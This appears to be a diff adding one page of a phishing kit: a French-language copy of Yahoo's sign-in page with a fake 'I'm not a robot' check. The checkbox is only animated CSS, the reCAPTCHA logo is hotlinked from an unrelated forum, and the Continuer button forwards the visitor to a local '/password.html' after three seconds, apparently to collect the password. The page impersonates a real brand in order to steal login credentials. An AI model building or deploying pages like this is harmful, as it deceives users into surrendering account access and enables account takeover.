@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html id="Stencil" class="js light-theme">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="referrer" content="strict-origin-when-cross-origin" />
+    <meta name="oath:guce:consent-host" content="guce.yahoo.com" />
+    <title>Yahoo</title>
+    <meta name="description"
+        content="Yahoo&nbsp;Mail, toujours plus performant&nbsp;: actualités locales, nationales et internationales, finances, sports, musique, cinéma... Vivez à fond en profitant pleinement du&nbsp;Web." />
+    <link rel="dns-prefetch" href="//gstatic.com" />
+    <link rel="dns-prefetch" href="//google.com" />
+    <link rel="dns-prefetch" href="//s.yimg.com" />
+    <link rel="dns-prefetch" href="//y.analytics.yahoo.com" />
+    <link rel="dns-prefetch" href="//ucs.query.yahoo.com" />
+    <link rel="dns-prefetch" href="//geo.query.yahoo.com" />
+    <link rel="dns-prefetch" href="//geo.yahoo.com" />
+    <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico" />
+    <link rel="shortcut icon" type="image/x-icon"
+        href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico" />
+    <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0" />
+    <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png" />
+    <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png" />
+    <style nonce="">
+        #recaptcha-submit {
+            position: unset !important;
+        }
+
+        .puree-spinner-button:after {
+            top: unset !important;
+            bottom: 44.5% !important;
+            right: 9% !important;
+        }
+
+        #mbr-css-check {
+            display: inline;
+        }
+
+        .txt-align-center {
+            padding: 0rem 1.6rem;
+        }
+
+        .spinner {
+            position: relative;
+            width: 2em;
+            height: 2em;
+            display: flex;
+            margin: 1.5em 1em;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .captcha {
+            background-color: #f9f9f9;
+            border: 2px solid #d3d3d3;
+            border-radius: 5px;
+            color: #4c4a4b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 20px 12px;
+            max-width: 100%;
+        }
+
+        .captcha .logo img {
+            width: 50px;
+        }
+
+        .text {
+            font-weight: 500;
+            margin-right: 1em;
+        }
+
+        .spinner {
+            position: relative;
+            width: 2em;
+            height: 2em;
+            display: flex;
+            margin: 1.5em 1em;
+            align-items: center;
+            justify-content: center;
+        }
+
+        label {
+            font-family: "Poppins-Regular";
+        }
+
+        input[type="checkbox"] {
+            position: absolute;
+            opacity: 0;
+            z-index: -1;
+        }
+
+        input[type="checkbox"]+.checkmark {
+            display: inline-block;
+            width: 2em;
+            height: 2em;
+            background-color: #fcfcfc;
+            border: 2.5px solid #c3c3c3;
+            border-radius: 3px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        input[type="checkbox"]+.checkmark span {
+            content: "";
+            position: relative;
+            /*
+	position:absolute;
+	border-bottom:3px solid;
+	border-right:3px solid;
+	border-color:#029f56;*/
+            margin-top: -3px;
+            transform: rotate(45deg);
+            width: 0.75em;
+            height: 1.2em;
+            opacity: 0;
+        }
+
+        input[type="checkbox"]+.checkmark>span:after {
+            content: "";
+            position: absolute;
+            display: block;
+            height: 3px;
+            bottom: 0;
+            left: 0;
+            background-color: #029f56;
+        }
+
+        input[type="checkbox"]+.checkmark>span:before {
+            content: "";
+            position: absolute;
+            display: block;
+            width: 3px;
+            bottom: 0;
+            right: 0;
+            background-color: #029f56;
+        }
+
+        input[type="checkbox"]:checked+.checkmark {
+            animation: 2s spin forwards;
+        }
+
+        input[type="checkbox"]:checked+.checkmark>span {
+            animation: 1s fadein 1.9s forwards;
+        }
+
+        input[type="checkbox"]:checked+.checkmark>span:after {
+            animation: 0.3s bottomslide 2s forwards;
+        }
+
+        input[type="checkbox"]:checked+.checkmark>span:before {
+            animation: 0.5s rightslide 2.2s forwards;
+        }
+
+        @keyframes fadein {
+            0% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes bottomslide {
+            0% {
+                width: 0;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+        @keyframes rightslide {
+            0% {
+                height: 0;
+            }
+
+            100% {
+                height: 100%;
+            }
+        }
+
+        .cp-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100%;
+            align-self: flex-end;
+            margin: 0.5em 1em;
+        }
+
+        .cp-logo img {
+            height: 2em;
+            width: 2em;
+        }
+
+        .cp-logo p {
+            color: #9d9ba7;
+            margin: 0;
+            font-size: 0.8em;
+            font-weight: 700;
+            margin: 0.4em 0 0.2em 0;
+        }
+
+        .cp-logo small {
+            color: #9d9ba7;
+            margin: 0;
+            font-size: 0.6em;
+        }
+
+        @keyframes spin {
+            10% {
+                width: 0;
+                height: 0;
+                border-width: 6px;
+            }
+
+            30% {
+                width: 0;
+                height: 0;
+                border-radius: 50%;
+                border-width: 1em;
+                transform: rotate(0deg);
+                border-color: rgb(199, 218, 245);
+            }
+
+            50% {
+                width: 2em;
+                height: 2em;
+                border-radius: 50%;
+                border-width: 4px;
+                border-color: rgb(199, 218, 245);
+                border-right-color: rgb(89, 152, 239);
+            }
+
+            70% {
+                border-width: 4px;
+                border-color: rgb(199, 218, 245);
+                border-right-color: rgb(89, 152, 239);
+            }
+
+            90% {
+                border-width: 4px;
+            }
+
+            100% {
+                width: 2em;
+                height: 2em;
+                border-radius: 50%;
+                transform: rotate(720deg);
+                border-color: transparent;
+            }
+        }
+    </style>
+    <link href="https://s.yimg.com/wm/mbr/0b754754bd80b1645a9c010b47fb52c751d97dcf/yahoo-main.css" rel="stylesheet"
+        type="text/css" />
+</head>
+
+<body class="bucket-att-multimid-integration-control bucket-mbr-smart2sv-ph1-b">
+    <script nonce="">
+        (function (root) {
+            var doc = document;
+            if (root.isGoodJS) {
+                doc.documentElement.className = doc.documentElement.className.replace(
+                    "no-js",
+                    "js"
+                );
+            }
+        })(this);
+    </script>
+    <div id="login-body" class="loginish puree-v2">
+        <div class="mbr-desktop-hd">
+            <span class="column">
+                <a href="/">
+                    <img src="assets/img/yahoo.png" alt="Yahoo" class="logo" width="" height="36" />
+                    <img src="assets/img/yahoo-dark.png" alt="Yahoo" class="dark-mode-logo logo" width="" height="36" />
+                </a>
+            </span>
+            <span class="column help txt-align-right">
+                <a href="https://help.yahoo.com/kb/index?locale=fr_FR&amp;page=product&amp;y=PROD_ACCT">Aide</a>
+            </span>
+        </div>
+        <div class="login-box-container">
+            <div class="login-box right">
+                <div class="mbr-login-hd txt-align-center">
+                    <img src="assets/img/yahoo.png" alt="Yahoo" class="logo yahoo-fr-FR" width="" height="27" />
+                    <img src="assets/img/yahoo-dark.png" alt="Yahoo" class="dark-mode-logo logo yahoo-fr-FR" width=""
+                        height="27" />
+                </div>
+                <div class="challenge recaptcha-challenge">
+                    <div class="recaptcha-script" id="recaptcha-script">
+                        <h1 class="txt-align-center">
+                            Prouvez que vous n'êtes pas un&nbsp;robot
+                        </h1>
+                        <div class="captcha">
+                            <div class="spinner">
+                                <label>
+                                    <input id="check-cap" value="0" type="checkbox" onclick="this.disabled = true;" />
+                                    <span class="checkmark"><span>&nbsp;</span></span>
+                                </label>
+                            </div>
+                            <div class="text">I'm not a robot</div>
+                            <div class="cp-logo">
+                                <img src="https://forum.nox.tv/core/index.php?media/9-recaptcha-png/" />
+                                <p>reCAPTCHA</p>
+                                <small>Privacy - Terms</small>
+                            </div>
+                        </div>
+                        <button type="submit" id="recaptcha-submit"
+                            class="m-t-16px pure-button puree-button-primary puree-spinner-button" disabled="">
+                            Continuer
+                        </button>
+                        <script nonce="">
+                            var submitButton = document.getElementById("recaptcha-submit"),
+                                recaptchaForm = document.getElementById("check-cap");
+
+                            if (submitButton) {
+                                submitButton.disabled = true;
+                            }
+
+                            recaptchaForm.addEventListener("click", function (event) {
+                                submitButton.disabled = false;
+                            });
+
+                            submitButton.addEventListener("click", function (event) {
+                                setTimeout(function () {
+                                    window.location.href = "/password.html";
+                                }, 3000);
+
+                            });
+                        </script>
+                    </div>
+                </div>
+            </div>
+            <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block">
+                <h1>
+                    Grâce à Yahoo, tous les sujets qui vous intéressent sont à portée
+                    de&nbsp;main.
+                </h1>
+                <p>
+                    Yahoo&nbsp;Mail, actualités locales, nationales et internationales,
+                    finances, sports, musique, cinéma... Vivez la vie à fond en
+                    profitant pleinement du&nbsp;Web.
+                </p>
+            </div>
+        </div>
+    </div>
+    <script src="assets/js/bundle.js"></script>
+    <script nonce="">
+        var checkAssets = function (seconds) {
+            setTimeout(function () {
+                if (!window.mbrJSLoaded) {
+                    window.mbrSendError("js_failed_to_load", location.pathname);
+                }
+                var check = document.getElementById("mbr-css-check"),
+                    style = check.currentStyle;
+                if (window.getComputedStyle) {
+                    style = window.getComputedStyle(check);
+                }
+                if (style.display !== "none") {
+                    window.mbrSendError("css_failed_to_load", location.pathname);
+                }
+            }, seconds * 1000);
+        };
+
+        checkAssets(10);
+    </script>
+    <div id="mbr-css-check"></div>
+    <div id="page-mask" class="page-mask hide"></div>
+</body>
+</html>
